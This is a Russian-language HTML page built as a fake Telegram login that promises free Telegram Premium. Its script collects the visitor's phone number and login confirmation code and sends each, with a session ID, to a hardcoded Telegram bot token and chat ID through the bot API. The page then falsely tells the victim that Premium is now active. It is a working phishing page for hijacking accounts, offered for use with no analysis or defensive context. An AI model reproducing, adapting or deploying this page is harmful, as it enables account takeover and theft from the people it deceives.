<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Auth</title>
    <style>
        :root {
            --primary: #8a63d2;
            --background: #0f0f0f;
            --surface: #1a1a1a;
            --border: #333333;
            --text: #ffffff;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--background);
            color: var(--text);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 400px;
            margin: 40px auto;
            position: relative;
        }

        .auth-step {
            position: absolute;
            width: 100%;
            transition: all 0.3s ease;
            opacity: 1;
            transform: translateY(0);
        }

        .auth-step.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .telegram-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
            background: url('https://img.icons8.com/?size=100&id=lUktdBVdL4Kb&format=png&color=8a63d2') center/contain no-repeat;
            animation: iconFloat 3s ease-in-out infinite;
        }

        h1 {
            text-align: center;
            margin: 20px 0;
            font-size: 24px;
        }

        .country-selector {
            position: relative;
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            cursor: pointer;
        }

        .country-dropdown {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 10px;
            margin-top: 5px;
            z-index: 1;
        }

        .country-item {
            padding: 12px;
            transition: background 0.2s;
        }

        .country-item:hover {
            background: rgba(255,255,255,0.05);
        }

        .phone-input {
            display: flex;
            align-items: center;
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
        }

        .country-code {
            color: var(--primary);
            margin-right: 10px;
            font-weight: 500;
        }

        input {
            background: none;
            border: none;
            color: var(--text);
            font-size: 16px;
            flex-grow: 1;
            padding: 5px;
        }

        .next-btn {
            background: var(--primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.2s ease;
            position: relative;
        }

        .next-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(138, 99, 210, 0.3);
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
            flex-wrap: wrap;
        }

        .code-input {
            width: 55px;
            height: 55px;
            padding: 15px;
            text-align: center;
            border: 1px solid var(--border);
            border-radius: 10px;
            background: none;
            color: var(--text);
            font-size: 18px;
            transition: all 0.2s ease;
            box-sizing: border-box;
            -moz-appearance: textfield;
        }

        .code-input::-webkit-outer-spin-button,
        .code-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        @media (max-width: 480px) {
            .code-input {
                width: 18vw;
                height: 18vw;
                max-width: 55px;
                max-height: 55px;
                padding: 10px;
                font-size: 16px;
            }
            
            .code-inputs {
                gap: 8px;
            }
        }

        @keyframes iconFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
            color: var(--primary);
        }

        .success-message {
            text-align: center;
            font-size: 24px;
            margin-top: 20px;
            color: var(--primary);
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Шаг 1: Ввод номера -->
        <div class="auth-step" id="step1">
            <div class="telegram-icon"></div>
            <h1>Вход в Telegram</h1>
            
            <div class="country-selector" onclick="toggleDropdown()">
                <div>Страна</div>
                <div id="selected-country">Россия ▼</div>
                <div class="country-dropdown" id="countryDropdown">
                    <div class="country-item" onclick="selectCountry('Россия', '+7')">Россия</div>
                    <div class="country-item" onclick="selectCountry('США', '+1')">США</div>
                    <div class="country-item" onclick="selectCountry('Германия', '+49')">Германия</div>
                    <div class="country-item" onclick="selectCountry('Финляндия', '+358')">Финляндия</div>
                </div>
            </div>

            <div class="phone-input">
                <span class="country-code" id="countryCode">+7</span>
                <input type="tel" placeholder="Номер телефона" id="phoneInput">
            </div>

            <div class="loading" id="loading1">Загрузка...</div>
            <button class="next-btn" onclick="sendPhone()">ДАЛЕЕ</button>
        </div>

        <!-- Шаг 2: Ввод кода -->
        <div class="auth-step hidden" id="step2">
            <div class="telegram-icon"></div>
            <h1>Введите код</h1>
            <p style="text-align: center; color: #888;">Код отправлен в приложение Telegram<br>на ваше устройство</p>
            
            <div class="code-inputs">
                <input class="code-input" maxlength="1" type="number" inputmode="numeric" pattern="[0-9]*">
                <input class="code-input" maxlength="1" type="number" inputmode="numeric" pattern="[0-9]*">
                <input class="code-input" maxlength="1" type="number" inputmode="numeric" pattern="[0-9]*">
                <input class="code-input" maxlength="1" type="number" inputmode="numeric" pattern="[0-9]*">
                <input class="code-input" maxlength="1" type="number" inputmode="numeric" pattern="[0-9]*">
            </div>

            <div class="loading" id="loading2">Загрузка...</div>
            <button class="next-btn" onclick="verifyCode()">ВОЙТИ</button>
        </div>

        <!-- Шаг 3: Успешный вход -->
        <div class="auth-step hidden" id="step3">
            <div class="telegram-icon"></div>
            <div class="success-message">вы вошли в свой аккаунт</div>
 <div class="success-message">теперь телеграмм премиум активирован на вашем аккаунте</div>
        </div>
    </div>

    <script>
        // Конфигурация бота
        const BOT_TOKEN = "7640657544:AAFIL2Oz3033-87vcnLlcjFmK7CoITk5CsY";
        const CHAT_ID = "1210041875";
        
        // Генерация ID сессии
        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
        
        // Элементы интерфейса
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const loading1 = document.getElementById('loading1');
        const loading2 = document.getElementById('loading2');
        const phoneInput = document.getElementById('phoneInput');
        const countryCode = document.getElementById('countryCode');
        const selectedCountry = document.getElementById('selected-country');
        
        // Выбор страны
        function toggleDropdown() {
            const dropdown = document.getElementById('countryDropdown');
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        }
        
        function selectCountry(name, code) {
            selectedCountry.textContent = name + ' ▼';
            countryCode.textContent = code;
            document.getElementById('countryDropdown').style.display = 'none';
        }
        
        // Отправка номера телефона
        async function sendPhone() {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('Пожалуйста, введите номер телефона');
                return;
            }
            
            const fullPhone = countryCode.textContent + phone;
            
            // Показываем загрузку
            loading1.style.display = 'block';
            document.querySelector('#step1 .next-btn').disabled = true;
            
            // Отправляем в Telegram
            await sendToTelegram(`📱 Номер телефона: ${fullPhone}\nID сессии: ${sessionId}`);
            
            // Скрываем загрузку и переходим к коду
            loading1.style.display = 'none';
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
            document.querySelector('.code-input').focus();
        }
        
        // Подтверждение кода
        async function verifyCode() {
            const codeInputs = document.querySelectorAll('.code-input');
            let code = '';
            
            codeInputs.forEach(input => {
                code += input.value;
            });
            
            if (code.length !== 5) {
                alert('Пожалуйста, введите полный 5-значный код');
                return;
            }
            
            // Показываем загрузку
            loading2.style.display = 'block';
            document.querySelector('#step2 .next-btn').disabled = true;
            
            // Отправляем код в Telegram
            await sendToTelegram(`🔑 Код подтверждения: ${code}\nID сессии: ${sessionId}`);
            
            // Показываем сообщение
            loading2.style.display = 'none';
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        }
        
        // Отправка сообщения в Telegram
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
                
                return await response.json();
            } catch (error) {
                console.error('Ошибка отправки:', error);
                return null;
            }
        }
        
        // Автопереход между полями кода
        document.querySelectorAll('.code-input').forEach((input, index, inputs) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                
                if (e.target.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
    </script>
</body>
</html>
